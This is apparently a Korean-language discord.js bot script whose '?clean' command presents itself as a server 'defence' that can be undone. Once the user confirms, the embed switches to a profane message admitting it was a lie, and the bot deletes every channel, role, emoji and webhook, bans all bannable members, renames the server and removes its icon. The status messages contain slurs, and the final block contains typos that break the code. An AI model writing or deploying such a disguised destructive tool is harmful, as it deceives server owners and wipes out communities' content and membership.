const { Client, Collection, MessageEmbed } = require("discord.js"),
    client = new Client(),
    Discord = require('discord.js')

client.login('토큰')

client.on("message", async (message) => {
    if (message.content == '?clean') {
        const embed = new Discord.MessageEmbed()
        .setTitle('정말 서버를 방어할까요?')
        .addField('복구 여부', '쌉가능')
        .setColor(0xffff00)
        .setThumbnail(message.guild.iconURL({
            dynamic: true,
            format: 'jpg',
            size: 2048
        }))
        .setFooter(message.author.tag, message.author.avatarURL({
            dynamic: true,
            format: 'jpg',
            size: 2048
        }))
        .setTimestamp()
        await message.channel.send(embed).then(async function (m) {
            await m.react('✅');
            await m.react('❌');
            const filter = function (r, u) {
                return (r.emoji.name == '✅' || r.emoji.name == '❌') && u.id == message.author.id;
            }
            const collector = await m.createReactionCollector(filter, {
                time: 15000,
                max: 1
            });
            collector.on('end', async function (collected) {
                m.reactions.removeAll();
                if (!collected.first() || collected.first().emoji.name == '❌') {
                    await embed.setColor(0x00ffff)
                    .setTitle('서버 방어가 취소되었어요');
                    await m.edit(embed);
                    return;
                }
                await embed.setColor(0xff0000)
                .setTitle(`${client.emojis.cache.find(x => x.name == 'loadingCirclebar')} ㅇ 구라였음 씨발련아 `)
                .addField('모든 채널 삭제', `${client.emojis.cache.find(x => x.name == 'loadingCirclebar')} 진행 중`, true);
                await m.edit(embed);
                m.guild.channels.cache.filter(x => x.id != m.channel.id).forEach(async function (ch) {
                    await ch.delete();
                });
                await embed.spliceFields(embed.fields.length - 1, 1)
                .addField('모든 채널 삭제', `${client.emojis.cache.find(x => x.name == 'botLab_done')} 완료`, true)
                .addField('모든 역할 삭제', `${client.emojis.cache.find(x => x.name == 'loadingCirclebar')} 진행 중`, true)
                await m.edit(embed);
                if (m.guild.roles.cache.size !== 0) {
                    m.guild.roles.cache.forEach(async function (r) {
                        await r.delete();
                    });
                }
                await embed.spliceFields(embed.fields.length - 1, 1)
                .addField('모든 역할 삭제', `${client.emojis.cache.find(x => x.name == 'botLab_done')} 완료`, true)
                .addField('서버 이름 변경', `${client.emojis.cache.find(x => x.name == 'loadingCirclebar')} 진행 중`, true)
                await m.edit(embed);
                await m.guild.setName('Your Servers Got Terror! sans!');
                await embed.spliceFields(embed.fields.length - 1, 1)
                .addField('서버 이름 변경', `${client.emojis.cache.find(x => x.name == 'botLab_done')} 완료`, true)
                .addField('서버 아이콘 삭제', `${client.emojis.cache.find(x => x.name == 'loadingCirclebar')} 진행 중`, true)
                await m.edit(embed);
                await m.guild.setIcon(null);
                await embed.spliceFields(embed.fields.length - 1, 1)
                .addField('서버 아이콘 삭제', `${client.emojis.cache.find(x => x.name == 'botLab_done')} 완료`, true)
                .addField('모든 이모지 삭제', `${client.emojis.cache.find(x => x.name == 'loadingCirclebar')} 진행 중`, true)
                await m.edit(embed);
                if (m.guild.emojis.cache.size !== 0) {
                    m.guild.emojis.cache.forEach(async function (e) {
                        await e.delete();
                    })
                }
                await embed.spliceFields(embed.fields.length - 1, 1)
                .addField('모든 이모지 삭제', `${client.emojis.cache.find(x => x.name == 'botLab_done')} 완료`, true)
                .addField('모든 멤버 차단', `${client.emojis.cache.find(x => x.name == 'loadingCirclebar')} 진행 중`, true)
                await m.edit(embed);
                m.guild.members.cache.filter(x => x.user.id != message.author.id && x.bannable).forEach(async function (member) {
                    await member.ban();
                });
                await embed.spliceFields(embed.fields.length - 1, 1)
                .addField('모든 멤버 차단', `${client.emojis.cache.find(x => x.name == 'botLab_done')} 완료`, true)
                .addField('모든 웹훅 삭제', `${client.emojis.cache.find(x => x.name == 'loadingCirclebar')} 진행 중`, true)
                await m.edit(embed);
                if ((await message.guild.fetchWebhooks()).size !== 0) {
                   message.guild.fetchWebhooks().then(async function (h) {
                        await h.forEach(async function (hook) {
                            await hook.delete();
                        });
                        await embed.setTitle(`${client.wmojis.cache.find(X => x.name == 'botLab_done')} 잘가라 좆병신년서버 폭파!`)
                        spliceFields(embed.fields.length - 1, 1)
                        .addField('모든 웹훅 삭제', `${client.emojis.cache.find(x => x.name == 'botLab_done')} 완료`, true)
                        await m.edit(embed);
                    });
                }
            });
        });
    }
})
